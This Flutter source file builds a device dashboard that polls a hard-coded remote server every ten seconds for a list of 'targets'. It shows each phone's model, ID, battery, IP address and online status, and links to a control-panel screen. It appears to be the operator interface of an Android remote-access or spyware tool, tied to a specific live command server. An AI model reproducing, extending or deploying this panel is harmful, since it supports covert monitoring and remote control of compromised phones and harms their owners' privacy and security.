import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';

class DeviceDashboardPage extends StatefulWidget {
  const DeviceDashboardPage({super.key});

  @override
  State<DeviceDashboardPage> createState() => _DeviceDashboardPageState();
}

class _DeviceDashboardPageState extends State<DeviceDashboardPage> {
  List<dynamic> _devices = [];
  bool _isLoading = true;
  Timer? _timer;

  @override
  void initState() {
    super.initState();
    _fetchDevices();
    _timer = Timer.periodic(const Duration(seconds: 10), (timer) => _fetchDevices());
  }

  @override
  void dispose() {
    _timer?.cancel();
    super.dispose();
  }

  Future<void> _fetchDevices() async {
    try {
      final response = await http.get(
        Uri.parse("http://capekkenaoanyak.onlinepanel.my.id:2002/api/list-targets"),
      ).timeout(const Duration(seconds: 10));

      if (response.statusCode == 200 && mounted) {
        setState(() {
          _devices = jsonDecode(response.body);
          _isLoading = false;
        });
      } else if (mounted) {
        setState(() => _isLoading = false);
      }
    } catch (e) {
      debugPrint("Error fetching devices: $e");
      if (mounted) setState(() => _isLoading = false);
    }
  }

  @override
  Widget build(BuildContext context) {
    int activeCount = _devices.where((d) => d['status'] == 'Online').length;

    return Scaffold(
      backgroundColor: const Color(0xFF0A0C10),
      body: SafeArea(
        child: Stack(
          children: [
            Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                Container(
                  padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 15),
                  decoration: BoxDecoration(
                    color: const Color(0xFF12161E),
                    borderRadius: const BorderRadius.only(
                      bottomLeft: Radius.circular(20),
                      bottomRight: Radius.circular(20),
                    ),
                    border: Border(bottom: BorderSide(color: Colors.purple.withOpacity(0.2))),
                  ),
                  child: Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          const Text("ACTIVE TARGETS", style: TextStyle(color: Colors.purple, fontSize: 8, letterSpacing: 1)),
                          const SizedBox(height: 4),
                          Text("$activeCount", style: const TextStyle(color: Colors.purpleAccent, fontSize: 20, fontWeight: FontWeight.bold)),
                        ],
                      ),
                      GestureDetector(
                        onTap: _fetchDevices,
                        child: Icon(Icons.radar, color: Colors.purpleAccent.withOpacity(0.8), size: 30),
                      ),
                      Column(
                        crossAxisAlignment: CrossAxisAlignment.end,
                        children: [
                          const Text("TOTAL DEVICES", style: TextStyle(color: Colors.white54, fontSize: 8, letterSpacing: 1)),
                          const SizedBox(height: 4),
                          Text("${_devices.length}", style: const TextStyle(color: Colors.purpleAccent, fontSize: 20, fontWeight: FontWeight.bold)),
                        ],
                      ),
                    ],
                  ),
                ),
                
                const SizedBox(height: 15),
                
                Padding(
                  padding: const EdgeInsets.symmetric(horizontal: 20),
                  child: Row(
                    mainAxisAlignment: MainAxisAlignment.spaceBetween,
                    children: [
                      const Text(
                        "CONNECTED DEVICES", 
                        style: TextStyle(color: Colors.purpleAccent, fontSize: 12, fontWeight: FontWeight.bold, letterSpacing: 1.5)
                      ),
                      GestureDetector(
                        onTap: () => Navigator.pop(context), 
                        child: const Icon(Icons.close, color: Colors.redAccent, size: 18),
                      )
                    ],
                  ),
                ),
                
                const SizedBox(height: 10),

                Expanded(
                  child: _isLoading 
                    ? const Center(child: CircularProgressIndicator(color: Colors.purpleAccent))
                    : _devices.isEmpty 
                      ? const Center(
                          child: Text("NO TARGETS FOUND", 
                          style: TextStyle(color: Colors.purple, fontWeight: FontWeight.bold, letterSpacing: 2)))
                      : ListView.builder(
                          padding: const EdgeInsets.symmetric(horizontal: 15, vertical: 10),
                          itemCount: _devices.length,
                          itemBuilder: (context, index) {
                            final device = _devices[index];
                            
                            bool isActive = device['status'] == 'Online';
                            Color statusColor = isActive ? Colors.purpleAccent : Colors.redAccent;

                            return GestureDetector(
                              onTap: () {
                                Navigator.pushNamed(
                                  context, 
                                  '/control_panel', 
                                  arguments: {
                                    'id': device['id']?.toString() ?? 'unknown',
                                    'model': device['model'] ?? 'Unknown Device',
                                    'battery': device['battery'] ?? '87',
                                    'status': device['status'] ?? 'Online',
                                    'ip': device['ip'] ?? '0.0.0.0',
                                    'lastSeen': device['lastSeen']?.toString() ?? DateTime.now().toString(),
                                  }
                                );
                              },
                              child: Container(
                                margin: const EdgeInsets.only(bottom: 8),
                                padding: const EdgeInsets.symmetric(horizontal: 15, vertical: 12),
                                decoration: BoxDecoration(
                                  color: const Color(0xFF0F1116),
                                  borderRadius: BorderRadius.circular(12),
                                  border: Border.all(
                                    color: isActive ? Colors.purpleAccent.withOpacity(0.5) : Colors.white12,
                                    width: 1,
                                  ),
                                ),
                                child: Row(
                                  children: [
                                    // Icon Device
                                    Container(
                                      padding: const EdgeInsets.all(10),
                                      decoration: BoxDecoration(
                                        color: Colors.purple.withOpacity(0.1),
                                        borderRadius: BorderRadius.circular(30),
                                      ),
                                      child: Icon(
                                        Icons.phone_android, 
                                        color: isActive ? Colors.purpleAccent : Colors.white38, 
                                        size: 28,
                                      ),
                                    ),
                                    
                                    const SizedBox(width: 15),
                                    
                                    // Nama Device & ID
                                    Expanded(
                                      flex: 2,
                                      child: Column(
                                        crossAxisAlignment: CrossAxisAlignment.start,
                                        children: [
                                          Text(
                                            device['model'] ?? "Unknown",
                                            style: const TextStyle(
                                              color: Colors.purpleAccent, 
                                              fontSize: 14, 
                                              fontWeight: FontWeight.bold
                                            ),
                                            maxLines: 1,
                                            overflow: TextOverflow.ellipsis,
                                          ),
                                          const SizedBox(height: 4),
                                          Text(
                                            device['id'] ?? "NO-ID",
                                            style: const TextStyle(color: Colors.white38, fontSize: 10),
                                            maxLines: 1,
                                            overflow: TextOverflow.ellipsis,
                                          ),
                                        ],
                                      ),
                                    ),
                                    
                                    // Status Indicator
                                    Container(
                                      padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                                      decoration: BoxDecoration(
                                        border: Border.all(color: statusColor.withOpacity(0.5)),
                                        borderRadius: BorderRadius.circular(12),
                                      ),
                                      child: Row(
                                        mainAxisSize: MainAxisSize.min,
                                        children: [
                                          CircleAvatar(radius: 3, backgroundColor: statusColor),
                                          const SizedBox(width: 5),
                                          Text(
                                            isActive ? "ON" : "OFF", 
                                            style: TextStyle(color: statusColor, fontSize: 9, fontWeight: FontWeight.bold)
                                          ),
                                        ],
                                      ),
                                    ),
                                    
                                    const SizedBox(width: 15),
                                    
                                    // Battery Info
                                    Row(
                                      children: [
                                        Icon(
                                          Icons.battery_charging_full, 
                                          color: isActive ? Colors.purpleAccent : Colors.white38, 
                                          size: 16
                                        ),
                                        const SizedBox(width: 5),
                                        Text(
                                          "${device['battery'] ?? '0'}%", 
                                          style: TextStyle(
                                            color: isActive ? Colors.purpleAccent : Colors.white54, 
                                            fontSize: 12, 
                                            fontWeight: FontWeight.bold
                                          )
                                        ),
                                      ],
                                    ),
                                    
                                    const SizedBox(width: 15),
                                    
                                    // IP Address
                                    Row(
                                      children: [
                                        Icon(Icons.wifi, color: Colors.white38, size: 14),
                                        const SizedBox(width: 4),
                                        Text(
                                          device['ip'] ?? "0.0.0.0", 
                                          style: const TextStyle(color: Colors.white38, fontSize: 11),
                                          maxLines: 1,
                                        ),
                                      ],
                                    ),
                                  ],
                                ),
                              ),
                            );
                          },
                        ),
                ),
              ],
            ),
          ],
        ),
      ),
    );
  }
}